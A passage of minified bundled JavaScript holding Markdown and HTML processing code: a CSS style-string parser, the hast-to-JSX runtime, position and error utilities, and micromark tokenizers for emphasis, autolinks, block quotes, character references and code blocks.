`,pb="/",mb="*",es="",zI="comment",WI="declaration";function qI(e,t){if(typeof e!="string")throw new TypeError("First argument must be a string");if(!e)return[];t=t||{};var n=1,r=1;function a(C){var P=C.match(jI);P&&(n+=P.length);var O=C.lastIndexOf(UI);r=~O?C.length-O:r+C.length}function l(){var C={line:n,column:r};return function(P){return P.position=new u(C),m(),P}}function u(C){this.start=C,this.end={line:n,column:r},this.source=t.source}u.prototype.content=e;function f(C){var P=new Error(t.source+":"+n+":"+r+": "+C);if(P.reason=C,P.filename=t.source,P.line=n,P.column=r,P.source=e,!t.silent)throw P}function h(C){var P=C.exec(e);if(P){var O=P[0];return a(O),e=e.slice(O.length),P}}function m(){h(RI)}function x(C){var P;for(C=C||[];P=g();)P!==!1&&C.push(P);return C}function g(){var C=l();if(!(pb!=e.charAt(0)||mb!=e.charAt(1))){for(var P=2;es!=e.charAt(P)&&(mb!=e.charAt(P)||pb!=e.charAt(P+1));)++P;if(P+=2,es===e.charAt(P-1))return f("End of comment missing");var O=e.slice(2,P-2);return r+=2,a(O),e=e.slice(P),r+=2,C({type:zI,comment:O})}}function b(){var C=l(),P=h(OI);if(P){if(g(),!h(FI))return f("property missing ':'");var O=h(MI),N=C({type:WI,property:gb(P[0].replace(hb,es)),value:O?gb(O[0].replace(hb,es)):es});return h(BI),N}}function E(){var C=[];x(C);for(var P;P=b();)P!==!1&&(C.push(P),x(C));return C}return m(),E()}function gb(e){return e?e.replace(HI,es):es}var $I=qI,YI=du&&du.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(lx,"__esModule",{value:!0});lx.default=GI;const VI=YI($I);function GI(e,t){let n=null;if(!e||typeof e!="string")return n;const r=(0,VI.default)(e),a=typeof t=="function";return r.forEach(l=>{if(l.type!=="declaration")return;const{property:u,value:f}=l;a?t(u,f,l):f&&(n=n||{},n[u]=f)}),n}var oh={};Object.defineProperty(oh,"__esModule",{value:!0});oh.camelCase=void 0;var QI=/^--[a-zA-Z0-9_-]+$/,KI=/-([a-z])/g,XI=/^[^-]+$/,ZI=/^-(webkit|moz|ms|o|khtml)-/,JI=/^-(ms)-/,e5=function(e){return!e||XI.test(e)||QI.test(e)},t5=function(e,t){return t.toUpperCase()},xb=function(e,t){return"".concat(t,"-")},n5=function(e,t){return t===void 0&&(t={}),e5(e)?e:(e=e.toLowerCase(),t.reactCompat?e=e.replace(JI,xb):e=e.replace(ZI,xb),e.replace(KI,t5))};oh.camelCase=n5;var r5=du&&du.__importDefault||function(e){return e&&e.__esModule?e:{default:e}},i5=r5(lx),a5=oh;function S0(e,t){var n={};return!e||typeof e!="string"||(0,i5.default)(e,function(r,a){r&&a&&(n[(0,a5.camelCase)(r,t)]=a)}),n}S0.default=S0;var s5=S0;const l5=bf(s5),uh=$k("end"),fi=$k("start");function $k(e){return t;function t(n){const r=n&&n.position&&n.position[e]||{};if(typeof r.line=="number"&&r.line>0&&typeof r.column=="number"&&r.column>0)return{line:r.line,column:r.column,offset:typeof r.offset=="number"&&r.offset>-1?r.offset:void 0}}}function Yk(e){const t=fi(e),n=uh(e);if(t&&n)return{start:t,end:n}}function ru(e){return!e||typeof e!="object"?"":"position"in e||"type"in e?yb(e.position):"start"in e||"end"in e?yb(e):"line"in e||"column"in e?N0(e):""}function N0(e){return vb(e&&e.line)+":"+vb(e&&e.column)}function yb(e){return N0(e&&e.start)+"-"+N0(e&&e.end)}function vb(e){return e&&typeof e=="number"?e:1}class Mn extends Error{constructor(t,n,r){super(),typeof n=="string"&&(r=n,n=void 0);let a="",l={},u=!1;if(n&&("line"in n&&"column"in n?l={place:n}:"start"in n&&"end"in n?l={place:n}:"type"in n?l={ancestors:[n],place:n.position}:l={...n}),typeof t=="string"?a=t:!l.cause&&t&&(u=!0,a=t.message,l.cause=t),!l.ruleId&&!l.source&&typeof r=="string"){const h=r.indexOf(":");h===-1?l.ruleId=r:(l.source=r.slice(0,h),l.ruleId=r.slice(h+1))}if(!l.place&&l.ancestors&&l.ancestors){const h=l.ancestors[l.ancestors.length-1];h&&(l.place=h.position)}const f=l.place&&"start"in l.place?l.place.start:l.place;this.ancestors=l.ancestors||void 0,this.cause=l.cause||void 0,this.column=f?f.column:void 0,this.fatal=void 0,this.file="",this.message=a,this.line=f?f.line:void 0,this.name=ru(l.place)||"1:1",this.place=l.place||void 0,this.reason=this.message,this.ruleId=l.ruleId||void 0,this.source=l.source||void 0,this.stack=u&&l.cause&&typeof l.cause.stack=="string"?l.cause.stack:"",this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}}Mn.prototype.file="";Mn.prototype.name="";Mn.prototype.reason="";Mn.prototype.message="";Mn.prototype.stack="";Mn.prototype.column=void 0;Mn.prototype.line=void 0;Mn.prototype.ancestors=void 0;Mn.prototype.cause=void 0;Mn.prototype.fatal=void 0;Mn.prototype.place=void 0;Mn.prototype.ruleId=void 0;Mn.prototype.source=void 0;const ox={}.hasOwnProperty,o5=new Map,u5=/[A-Z]/g,c5=new Set(["table","tbody","thead","tfoot","tr"]),d5=new Set(["td","th"]),Vk="https://github.com/syntax-tree/hast-util-to-jsx-runtime";function f5(e,t){if(!t||t.Fragment===void 0)throw new TypeError("Expected `Fragment` in options");const n=t.filePath||void 0;let r;if(t.development){if(typeof t.jsxDEV!="function")throw new TypeError("Expected `jsxDEV` in options when `development: true`");r=b5(n,t.jsxDEV)}else{if(typeof t.jsx!="function")throw new TypeError("Expected `jsx` in production options");if(typeof t.jsxs!="function")throw new TypeError("Expected `jsxs` in production options");r=v5(n,t.jsx,t.jsxs)}const a={Fragment:t.Fragment,ancestors:[],components:t.components||{},create:r,elementAttributeNameCase:t.elementAttributeNameCase||"react",evaluater:t.createEvaluater?t.createEvaluater():void 0,filePath:n,ignoreInvalidStyle:t.ignoreInvalidStyle||!1,passKeys:t.passKeys!==!1,passNode:t.passNode||!1,schema:t.space==="svg"?zl:lh,stylePropertyNameCase:t.stylePropertyNameCase||"dom",tableCellAlignToStyle:t.tableCellAlignToStyle!==!1},l=Gk(a,e,void 0);return l&&typeof l!="string"?l:a.create(e,a.Fragment,{children:l||void 0},void 0)}function Gk(e,t,n){if(t.type==="element")return h5(e,t,n);if(t.type==="mdxFlowExpression"||t.type==="mdxTextExpression")return p5(e,t);if(t.type==="mdxJsxFlowElement"||t.type==="mdxJsxTextElement")return g5(e,t,n);if(t.type==="mdxjsEsm")return m5(e,t);if(t.type==="root")return x5(e,t,n);if(t.type==="text")return y5(e,t)}function h5(e,t,n){const r=e.schema;let a=r;t.tagName.toLowerCase()==="svg"&&r.space==="html"&&(a=zl,e.schema=a),e.ancestors.push(t);const l=Kk(e,t.tagName,!1),u=E5(e,t);let f=cx(e,t);return c5.has(t.tagName)&&(f=f.filter(function(h){return typeof h=="string"?!CI(h):!0})),Qk(e,u,l,t),ux(u,f),e.ancestors.pop(),e.schema=r,e.create(t,l,u,n)}function p5(e,t){if(t.data&&t.data.estree&&e.evaluater){const r=t.data.estree.body[0];return r.type,e.evaluater.evaluateExpression(r.expression)}Mu(e,t.position)}function m5(e,t){if(t.data&&t.data.estree&&e.evaluater)return e.evaluater.evaluateProgram(t.data.estree);Mu(e,t.position)}function g5(e,t,n){const r=e.schema;let a=r;t.name==="svg"&&r.space==="html"&&(a=zl,e.schema=a),e.ancestors.push(t);const l=t.name===null?e.Fragment:Kk(e,t.name,!0),u=w5(e,t),f=cx(e,t);return Qk(e,u,l,t),ux(u,f),e.ancestors.pop(),e.schema=r,e.create(t,l,u,n)}function x5(e,t,n){const r={};return ux(r,cx(e,t)),e.create(t,e.Fragment,r,n)}function y5(e,t){return t.value}function Qk(e,t,n,r){typeof n!="string"&&n!==e.Fragment&&e.passNode&&(t.node=r)}function ux(e,t){if(t.length>0){const n=t.length>1?t:t[0];n&&(e.children=n)}}function v5(e,t,n){return r;function r(a,l,u,f){const m=Array.isArray(u.children)?n:t;return f?m(l,u,f):m(l,u)}}function b5(e,t){return n;function n(r,a,l,u){const f=Array.isArray(l.children),h=fi(r);return t(a,l,u,f,{columnNumber:h?h.column-1:void 0,fileName:e,lineNumber:h?h.line:void 0},void 0)}}function E5(e,t){const n={};let r,a;for(a in t.properties)if(a!=="children"&&ox.call(t.properties,a)){const l=k5(e,a,t.properties[a]);if(l){const[u,f]=l;e.tableCellAlignToStyle&&u==="align"&&typeof f=="string"&&d5.has(t.tagName)?r=f:n[u]=f}}if(r){const l=n.style||(n.style={});l[e.stylePropertyNameCase==="css"?"text-align":"textAlign"]=r}return n}function w5(e,t){const n={};for(const r of t.attributes)if(r.type==="mdxJsxExpressionAttribute")if(r.data&&r.data.estree&&e.evaluater){const l=r.data.estree.body[0];l.type;const u=l.expression;u.type;const f=u.properties[0];f.type,Object.assign(n,e.evaluater.evaluateExpression(f.argument))}else Mu(e,t.position);else{const a=r.name;let l;if(r.value&&typeof r.value=="object")if(r.value.data&&r.value.data.estree&&e.evaluater){const f=r.value.data.estree.body[0];f.type,l=e.evaluater.evaluateExpression(f.expression)}else Mu(e,t.position);else l=r.value===null?!0:r.value;n[a]=l}return n}function cx(e,t){const n=[];let r=-1;const a=e.passKeys?new Map:o5;for(;++r<t.children.length;){const l=t.children[r];let u;if(e.passKeys){const h=l.type==="element"?l.tagName:l.type==="mdxJsxFlowElement"||l.type==="mdxJsxTextElement"?l.name:void 0;if(h){const m=a.get(h)||0;u=h+"-"+m,a.set(h,m+1)}}const f=Gk(e,l,u);f!==void 0&&n.push(f)}return n}function k5(e,t,n){const r=sx(e.schema,t);if(!(n==null||typeof n=="number"&&Number.isNaN(n))){if(Array.isArray(n)&&(n=r.commaSeparated?Ok(n):qk(n)),r.property==="style"){let a=typeof n=="object"?n:T5(e,String(n));return e.stylePropertyNameCase==="css"&&(a=C5(a)),["style",a]}return[e.elementAttributeNameCase==="react"&&r.space?DI[r.property]||r.property:r.attribute,n]}}function T5(e,t){try{return l5(t,{reactCompat:!0})}catch(n){if(e.ignoreInvalidStyle)return{};const r=n,a=new Mn("Cannot parse `style` attribute",{ancestors:e.ancestors,cause:r,ruleId:"style",source:"hast-util-to-jsx-runtime"});throw a.file=e.filePath||void 0,a.url=Vk+"#cannot-parse-style-attribute",a}}function Kk(e,t,n){let r;if(!n)r={type:"Literal",value:t};else if(t.includes(".")){const a=t.split(".");let l=-1,u;for(;++l<a.length;){const f=ob(a[l])?{type:"Identifier",name:a[l]}:{type:"Literal",value:a[l]};u=u?{type:"MemberExpression",object:u,property:f,computed:!!(l&&f.type==="Literal"),optional:!1}:f}r=u}else r=ob(t)&&!/^[a-z]/.test(t)?{type:"Identifier",name:t}:{type:"Literal",value:t};if(r.type==="Literal"){const a=r.value;return ox.call(e.components,a)?e.components[a]:a}if(e.evaluater)return e.evaluater.evaluateExpression(r);Mu(e)}function Mu(e,t){const n=new Mn("Cannot handle MDX estrees without `createEvaluater`",{ancestors:e.ancestors,place:t,ruleId:"mdx-estree",source:"hast-util-to-jsx-runtime"});throw n.file=e.filePath||void 0,n.url=Vk+"#cannot-handle-mdx-estrees-without-createevaluater",n}function C5(e){const t={};let n;for(n in e)ox.call(e,n)&&(t[S5(n)]=e[n]);return t}function S5(e){let t=e.replace(u5,N5);return t.slice(0,3)==="ms-"&&(t="-"+t),t}function N5(e){return"-"+e.toLowerCase()}const rm={action:["form"],cite:["blockquote","del","ins","q"],data:["object"],formAction:["button","input"],href:["a","area","base","link"],icon:["menuitem"],itemId:null,manifest:["html"],ping:["a","area"],poster:["video"],src:["audio","embed","iframe","img","input","script","source","track","video"]},A5={};function dx(e,t){const n=A5,r=typeof n.includeImageAlt=="boolean"?n.includeImageAlt:!0,a=typeof n.includeHtml=="boolean"?n.includeHtml:!0;return Xk(e,r,a)}function Xk(e,t,n){if(D5(e)){if("value"in e)return e.type==="html"&&!n?"":e.value;if(t&&"alt"in e&&e.alt)return e.alt;if("children"in e)return bb(e.children,t,n)}return Array.isArray(e)?bb(e,t,n):""}function bb(e,t,n){const r=[];let a=-1;for(;++a<e.length;)r[a]=Xk(e[a],t,n);return r.join("")}function D5(e){return!!(e&&typeof e=="object")}const Eb=document.createElement("i");function fx(e){const t="&"+e+";";Eb.innerHTML=t;const n=Eb.textContent;return n.charCodeAt(n.length-1)===59&&e!=="semi"||n===t?!1:n}function vr(e,t,n,r){const a=e.length;let l=0,u;if(t<0?t=-t>a?0:a+t:t=t>a?a:t,n=n>0?n:0,r.length<1e4)u=Array.from(r),u.unshift(t,n),e.splice(...u);else for(n&&e.splice(t,n);l<r.length;)u=r.slice(l,l+1e4),u.unshift(t,0),e.splice(...u),l+=1e4,t+=1e4}function Ar(e,t){return e.length>0?(vr(e,e.length,0,t),e):t}const wb={}.hasOwnProperty;function Zk(e){const t={};let n=-1;for(;++n<e.length;)L5(t,e[n]);return t}function L5(e,t){let n;for(n in t){const a=(wb.call(e,n)?e[n]:void 0)||(e[n]={}),l=t[n];let u;if(l)for(u in l){wb.call(a,u)||(a[u]=[]);const f=l[u];_5(a[u],Array.isArray(f)?f:f?[f]:[])}}}function _5(e,t){let n=-1;const r=[];for(;++n<t.length;)(t[n].add==="after"?e:r).push(t[n]);vr(e,0,0,r)}function Jk(e,t){const n=Number.parseInt(e,t);return n<9||n===11||n>13&&n<32||n>126&&n<160||n>55295&&n<57344||n>64975&&n<65008||(n&65535)===65535||(n&65535)===65534||n>1114111?"":String.fromCodePoint(n)}function Qr(e){return e.replace(/[\t\n\r ]+/g," ").replace(/^ | $/g,"").toLowerCase().toUpperCase()}const Kn=Ra(/[A-Za-z]/),On=Ra(/[\dA-Za-z]/),I5=Ra(/[#-'*+\--9=?A-Z^-~]/);function pf(e){return e!==null&&(e<32||e===127)}const A0=Ra(/\d/),P5=Ra(/[\dA-Fa-f]/),j5=Ra(/[!-/:-@[-`{-~]/);function Xe(e){return e!==null&&e<-2}function At(e){return e!==null&&(e<0||e===32)}function ct(e){return e===-2||e===-1||e===32}const ch=Ra(new RegExp("\\p{P}|\\p{S}","u")),gs=Ra(/\s/);function Ra(e){return t;function t(n){return n!==null&&n>-1&&e.test(String.fromCharCode(n))}}function Wl(e){const t=[];let n=-1,r=0,a=0;for(;++n<e.length;){const l=e.charCodeAt(n);let u="";if(l===37&&On(e.charCodeAt(n+1))&&On(e.charCodeAt(n+2)))a=2;else if(l<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(l))||(u=String.fromCharCode(l));else if(l>55295&&l<57344){const f=e.charCodeAt(n+1);l<56320&&f>56319&&f<57344?(u=String.fromCharCode(l,f),a=1):u=""}else u=String.fromCharCode(l);u&&(t.push(e.slice(r,n),encodeURIComponent(u)),r=n+a+1,u=""),a&&(n+=a,a=0)}return t.join("")+e.slice(r)}function ft(e,t,n,r){const a=r?r-1:Number.POSITIVE_INFINITY;let l=0;return u;function u(h){return ct(h)?(e.enter(n),f(h)):t(h)}function f(h){return ct(h)&&l++<a?(e.consume(h),f):(e.exit(n),t(h))}}const R5={tokenize:O5};function O5(e){const t=e.attempt(this.parser.constructs.contentInitial,r,a);let n;return t;function r(f){if(f===null){e.consume(f);return}return e.enter("lineEnding"),e.consume(f),e.exit("lineEnding"),ft(e,t,"linePrefix")}function a(f){return e.enter("paragraph"),l(f)}function l(f){const h=e.enter("chunkText",{contentType:"text",previous:n});return n&&(n.next=h),n=h,u(f)}function u(f){if(f===null){e.exit("chunkText"),e.exit("paragraph"),e.consume(f);return}return Xe(f)?(e.consume(f),e.exit("chunkText"),l):(e.consume(f),u)}}const F5={tokenize:M5},kb={tokenize:B5};function M5(e){const t=this,n=[];let r=0,a,l,u;return f;function f(A){if(r<n.length){const _=n[r];return t.containerState=_[1],e.attempt(_[0].continuation,h,m)(A)}return m(A)}function h(A){if(r++,t.containerState._closeFlow){t.containerState._closeFlow=void 0,a&&T();const _=t.events.length;let M=_,R;for(;M--;)if(t.events[M][0]==="exit"&&t.events[M][1].type==="chunkFlow"){R=t.events[M][1].end;break}N(r);let B=_;for(;B<t.events.length;)t.events[B][1].end={...R},B++;return vr(t.events,M+1,0,t.events.slice(_)),t.events.length=B,m(A)}return f(A)}function m(A){if(r===n.length){if(!a)return b(A);if(a.currentConstruct&&a.currentConstruct.concrete)return C(A);t.interrupt=!!(a.currentConstruct&&!a._gfmTableDynamicInterruptHack)}return t.containerState={},e.check(kb,x,g)(A)}function x(A){return a&&T(),N(r),b(A)}function g(A){return t.parser.lazy[t.now().line]=r!==n.length,u=t.now().offset,C(A)}function b(A){return t.containerState={},e.attempt(kb,E,C)(A)}function E(A){return r++,n.push([t.currentConstruct,t.containerState]),b(A)}function C(A){if(A===null){a&&T(),N(0),e.consume(A);return}return a=a||t.parser.flow(t.now()),e.enter("chunkFlow",{_tokenizer:a,contentType:"flow",previous:l}),P(A)}function P(A){if(A===null){O(e.exit("chunkFlow"),!0),N(0),e.consume(A);return}return Xe(A)?(e.consume(A),O(e.exit("chunkFlow")),r=0,t.interrupt=void 0,f):(e.consume(A),P)}function O(A,_){const M=t.sliceStream(A);if(_&&M.push(null),A.previous=l,l&&(l.next=A),l=A,a.defineSkip(A.start),a.write(M),t.parser.lazy[A.start.line]){let R=a.events.length;for(;R--;)if(a.events[R][1].start.offset<u&&(!a.events[R][1].end||a.events[R][1].end.offset>u))return;const B=t.events.length;let U=B,$,Y;for(;U--;)if(t.events[U][0]==="exit"&&t.events[U][1].type==="chunkFlow"){if($){Y=t.events[U][1].end;break}$=!0}for(N(r),R=B;R<t.events.length;)t.events[R][1].end={...Y},R++;vr(t.events,U+1,0,t.events.slice(B)),t.events.length=R}}function N(A){let _=n.length;for(;_-- >A;){const M=n[_];t.containerState=M[1],M[0].exit.call(t,e)}n.length=A}function T(){a.write([null]),l=void 0,a=void 0,t.containerState._closeFlow=void 0}}function B5(e,t,n){return ft(e,e.attempt(this.parser.constructs.document,t,n),"linePrefix",this.parser.constructs.disable.null.includes("codeIndented")?void 0:4)}function Ll(e){if(e===null||At(e)||gs(e))return 1;if(ch(e))return 2}function dh(e,t,n){const r=[];let a=-1;for(;++a<e.length;){const l=e[a].resolveAll;l&&!r.includes(l)&&(t=l(t,n),r.push(l))}return t}const D0={name:"attention",resolveAll:H5,tokenize:U5};function H5(e,t){let n=-1,r,a,l,u,f,h,m,x;for(;++n<e.length;)if(e[n][0]==="enter"&&e[n][1].type==="attentionSequence"&&e[n][1]._close){for(r=n;r--;)if(e[r][0]==="exit"&&e[r][1].type==="attentionSequence"&&e[r][1]._open&&t.sliceSerialize(e[r][1]).charCodeAt(0)===t.sliceSerialize(e[n][1]).charCodeAt(0)){if((e[r][1]._close||e[n][1]._open)&&(e[n][1].end.offset-e[n][1].start.offset)%3&&!((e[r][1].end.offset-e[r][1].start.offset+e[n][1].end.offset-e[n][1].start.offset)%3))continue;h=e[r][1].end.offset-e[r][1].start.offset>1&&e[n][1].end.offset-e[n][1].start.offset>1?2:1;const g={...e[r][1].end},b={...e[n][1].start};Tb(g,-h),Tb(b,h),u={type:h>1?"strongSequence":"emphasisSequence",start:g,end:{...e[r][1].end}},f={type:h>1?"strongSequence":"emphasisSequence",start:{...e[n][1].start},end:b},l={type:h>1?"strongText":"emphasisText",start:{...e[r][1].end},end:{...e[n][1].start}},a={type:h>1?"strong":"emphasis",start:{...u.start},end:{...f.end}},e[r][1].end={...u.start},e[n][1].start={...f.end},m=[],e[r][1].end.offset-e[r][1].start.offset&&(m=Ar(m,[["enter",e[r][1],t],["exit",e[r][1],t]])),m=Ar(m,[["enter",a,t],["enter",u,t],["exit",u,t],["enter",l,t]]),m=Ar(m,dh(t.parser.constructs.insideSpan.null,e.slice(r+1,n),t)),m=Ar(m,[["exit",l,t],["enter",f,t],["exit",f,t],["exit",a,t]]),e[n][1].end.offset-e[n][1].start.offset?(x=2,m=Ar(m,[["enter",e[n][1],t],["exit",e[n][1],t]])):x=0,vr(e,r-1,n-r+3,m),n=r+m.length-x-2;break}}for(n=-1;++n<e.length;)e[n][1].type==="attentionSequence"&&(e[n][1].type="data");return e}function U5(e,t){const n=this.parser.constructs.attentionMarkers.null,r=this.previous,a=Ll(r);let l;return u;function u(h){return l=h,e.enter("attentionSequence"),f(h)}function f(h){if(h===l)return e.consume(h),f;const m=e.exit("attentionSequence"),x=Ll(h),g=!x||x===2&&a||n.includes(h),b=!a||a===2&&x||n.includes(r);return m._open=!!(l===42?g:g&&(a||!b)),m._close=!!(l===42?b:b&&(x||!g)),t(h)}}function Tb(e,t){e.column+=t,e.offset+=t,e._bufferIndex+=t}const z5={name:"autolink",tokenize:W5};function W5(e,t,n){let r=0;return a;function a(E){return e.enter("autolink"),e.enter("autolinkMarker"),e.consume(E),e.exit("autolinkMarker"),e.enter("autolinkProtocol"),l}function l(E){return Kn(E)?(e.consume(E),u):E===64?n(E):m(E)}function u(E){return E===43||E===45||E===46||On(E)?(r=1,f(E)):m(E)}function f(E){return E===58?(e.consume(E),r=0,h):(E===43||E===45||E===46||On(E))&&r++<32?(e.consume(E),f):(r=0,m(E))}function h(E){return E===62?(e.exit("autolinkProtocol"),e.enter("autolinkMarker"),e.consume(E),e.exit("autolinkMarker"),e.exit("autolink"),t):E===null||E===32||E===60||pf(E)?n(E):(e.consume(E),h)}function m(E){return E===64?(e.consume(E),x):I5(E)?(e.consume(E),m):n(E)}function x(E){return On(E)?g(E):n(E)}function g(E){return E===46?(e.consume(E),r=0,x):E===62?(e.exit("autolinkProtocol").type="autolinkEmail",e.enter("autolinkMarker"),e.consume(E),e.exit("autolinkMarker"),e.exit("autolink"),t):b(E)}function b(E){if((E===45||On(E))&&r++<63){const C=E===45?b:g;return e.consume(E),C}return n(E)}}const nc={partial:!0,tokenize:q5};function q5(e,t,n){return r;function r(l){return ct(l)?ft(e,a,"linePrefix")(l):a(l)}function a(l){return l===null||Xe(l)?t(l):n(l)}}const eT={continuation:{tokenize:Y5},exit:V5,name:"blockQuote",tokenize:$5};function $5(e,t,n){const r=this;return a;function a(u){if(u===62){const f=r.containerState;return f.open||(e.enter("blockQuote",{_container:!0}),f.open=!0),e.enter("blockQuotePrefix"),e.enter("blockQuoteMarker"),e.consume(u),e.exit("blockQuoteMarker"),l}return n(u)}function l(u){return ct(u)?(e.enter("blockQuotePrefixWhitespace"),e.consume(u),e.exit("blockQuotePrefixWhitespace"),e.exit("blockQuotePrefix"),t):(e.exit("blockQuotePrefix"),t(u))}}function Y5(e,t,n){const r=this;return a;function a(u){return ct(u)?ft(e,l,"linePrefix",r.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(u):l(u)}function l(u){return e.attempt(eT,t,n)(u)}}function V5(e){e.exit("blockQuote")}const tT={name:"characterEscape",tokenize:G5};function G5(e,t,n){return r;function r(l){return e.enter("characterEscape"),e.enter("escapeMarker"),e.consume(l),e.exit("escapeMarker"),a}function a(l){return j5(l)?(e.enter("characterEscapeValue"),e.consume(l),e.exit("characterEscapeValue"),e.exit("characterEscape"),t):n(l)}}const nT={name:"characterReference",tokenize:Q5};function Q5(e,t,n){const r=this;let a=0,l,u;return f;function f(g){return e.enter("characterReference"),e.enter("characterReferenceMarker"),e.consume(g),e.exit("characterReferenceMarker"),h}function h(g){return g===35?(e.enter("characterReferenceMarkerNumeric"),e.consume(g),e.exit("characterReferenceMarkerNumeric"),m):(e.enter("characterReferenceValue"),l=31,u=On,x(g))}function m(g){return g===88||g===120?(e.enter("characterReferenceMarkerHexadecimal"),e.consume(g),e.exit("characterReferenceMarkerHexadecimal"),e.enter("characterReferenceValue"),l=6,u=P5,x):(e.enter("characterReferenceValue"),l=7,u=A0,x(g))}function x(g){if(g===59&&a){const b=e.exit("characterReferenceValue");return u===On&&!fx(r.sliceSerialize(b))?n(g):(e.enter("characterReferenceMarker"),e.consume(g),e.exit("characterReferenceMarker"),e.exit("characterReference"),t)}return u(g)&&a++<l?(e.consume(g),x):n(g)}}const Cb={partial:!0,tokenize:X5},Sb={concrete:!0,name:"codeFenced",tokenize:K5};function K5(e,t,n){const r=this,a={partial:!0,tokenize:M};let l=0,u=0,f;return h;function h(R){return m(R)}function m(R){const B=r.events[r.events.length-1];return l=B&&B[1].type==="linePrefix"?B[2].sliceSerialize(B[1],!0).length:0,f=R,e.enter("codeFenced"),e.enter("codeFencedFence"),e.enter("codeFencedFenceSequence"),x(R)}function x(R){return R===f?(u++,e.consume(R),x):u<3?n(R):(e.exit("codeFencedFenceSequence"),ct(R)?ft(e,g,"whitespace")(R):g(R))}function g(R){return R===null||Xe(R)?(e.exit("codeFencedFence"),r.interrupt?t(R):e.check(Cb,P,_)(R)):(e.enter("codeFencedFenceInfo"),e.enter("chunkString",{contentType:"string"}),b(R))}function b(R){return R===null||Xe(R)?(e.exit("chunkString"),e.exit("codeFencedFenceInfo"),g(R)):ct(R)?(e.exit("chunkString"),e.exit("codeFencedFenceInfo"),ft(e,E,"whitespace")(R)):R===96&&R===f?n(R):(e.consume(R),b)}function E(R){return R===null||Xe(R)?g(R):(e.enter("codeFencedFenceMeta"),e.enter("chunkString",{contentType:"string"}),C(R))}function C(R){return R===null||Xe(R)?(e.exit("chunkString"),e.exit("codeFencedFenceMeta"),g(R)):R===96&&R===f?n(R):(e.consume(R),C)}function P(R){return e.attempt(a,_,O)(R)}function O(R){return e.enter("lineEnding"),e.consume(R),e.exit("lineEnding"),N}function N(R){return l>0&&ct(R)?ft(e,T,"linePrefix",l+1)(R):T(R)}function T(R){return R===null||Xe(R)?e.check(Cb,P,_)(R):(e.enter("codeFlowValue"),A(R))}function A(R){return R===null||Xe(R)?(e.exit("codeFlowValue"),T(R)):(e.consume(R),A)}function _(R){return e.exit("codeFenced"),t(R)}function M(R,B,U){let $=0;return Y;function Y(J){return R.enter("lineEnding"),R.consume(J),R.exit("lineEnding"),ne}function ne(J){return R.enter("codeFencedFence"),ct(J)?ft(R,Z,"linePrefix",r.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(J):Z(J)}function Z(J){return J===f?(R.enter("codeFencedFenceSequence"),me(J)):U(J)}function me(J){return J===f?($++,R.consume(J),me):$>=u?(R.exit("codeFencedFenceSequence"),ct(J)?ft(R,ye,"whitespace")(J):ye(J)):U(J)}function ye(J){return J===null||Xe(J)?(R.exit("codeFencedFence"),B(J)):U(J)}}}function X5(e,t,n){const r=this;return a;function a(u){return u===null?n(u):(e.enter("lineEnding"),e.consume(u),e.exit("lineEnding"),l)}function l(u){return r.parser.lazy[r.now().line]?n(u):t(u)}}const im={name:"codeIndented",tokenize:J5},Z5={partial:!0,tokenize:eP};function J5(e,t,n){const r=this;return a;function a(m){return e.enter("codeIndented"),ft(e,l,"linePrefix",5)(m)}function l(m){const x=r.events[r.events.length-1];return x&&x[1].type==="linePrefix"&&x[2].sliceSerialize(x[1],!0).length>=4?u(m):n(m)}function u(m){return m===null?h(m):Xe(m)?e.attempt(Z5,u,h)(m):(e.enter("codeFlowValue"),f(m))}function f(m){return m===null||Xe(m)?(e.exit("codeFlowValue"),u(m)):(e.consume(m),f)}function h(m){return e.exit("codeIndented"),t(m)}}function eP(e,t,n){const r=this;return a;function a(u){return r.parser.lazy[r.now().line]?n(u):Xe(u)?(e.enter("lineEnding"),e.consume(u),e.exit("lineEnding"),a):ft(e,l,"linePrefix",5)(u)}function l(u){const f=r.events[r.events.length-1];return f&&f[1].type==="linePrefix"&&f[2].sliceSerialize(f[1],!0).length>=4?t(u):Xe(u)?a(u):n(u)}}const tP={name:"codeText",previous:rP,resolve:nP,tokenize:iP};function nP(e){let t=e.length-4,n=3,r,a;if((e[n][1].type==="lineEnding"||e[n][1].type==="space")&&(e[t][1].type==="lineEnding"||e[t][1].type==="space")){for(r=n;++r<t;)if(e[r][1].type==="codeTextData"){e[n][1].type="codeTextPadding",e[t][1].type="codeTextPadding",n+=2,t-=2;break}}for(r=n-1,t++;++r<=t;)a===void 0?r!==t&&e[r][1].type!=="lineEnding"&&(a=r):(r===t||e[r][1].type==="lineEnding")&&(e[a][1].type="codeTextData",r!==a+2&&(e[a][1].end=e[r-1][1].end,e.splice(a+2,r-a-2),t-=r-a-2,r=a+2),a=void 0);return e}function rP(e){return e!==96||this.events[this.events.length-1][1].type==="characterEscape"}function iP(e,t,n){let r=0,a,l;return u;function u(g){return e.enter("codeText"),e.enter("codeTextSequence"),f(g)}function f(g){return g===96?(e.consume(g),r++,f):(e.exit("codeTextSequence"),h(g))}function h(g){return g===null?n(g):g===32?(e.enter("space"),e.consume(g),e.exit("space"),h):g===96?(l=e.enter("codeTextSequence"),a=0,x(g)):Xe(g)?(e.enter("lineEnding"),e.consume(g),e.exit("lineEnding"),h):(e.enter("codeTextData"),m(g))}function m(g){return g===null||g===32||g===96||Xe(g)?(e.exit("codeTextData"),h(g)):(e.consume(g),m)}function x(g){return g===96?(e.consume(g),a++,x):a===r?(e.exit("codeTextSequence"),e.exit("codeText"),t(g)):(l.type="codeTextData",m(g))}}class aP{constructor(t){this.left=t?[...t]:[],this.right=[]}get(t){if(t<0||t>=this.left.length+this.right.length)throw new RangeError("Cannot access index `"+t+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return t<this.left.length?this.left[t]:this.right[this.right.length-t+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(t,n){const r=n??Number.POSITIVE_INFINITY;return r<this.left.length?this.left.slice(t,r):t>this.left.length?this.right.slice(this.right.length-r+this.left.length,this.right.length-t+this.left.length).reverse():this.left.slice(t).concat(this.right.slice(this.right.length-r+this.left.length).reverse())}splice(t,n,r){const a=n||0;this.setCursor(Math.trunc(t));const l=this.right.splice(this.right.length-a,Number.POSITIVE_INFINITY);return r&&Fo(this.left,r),l.reverse()}pop(){return 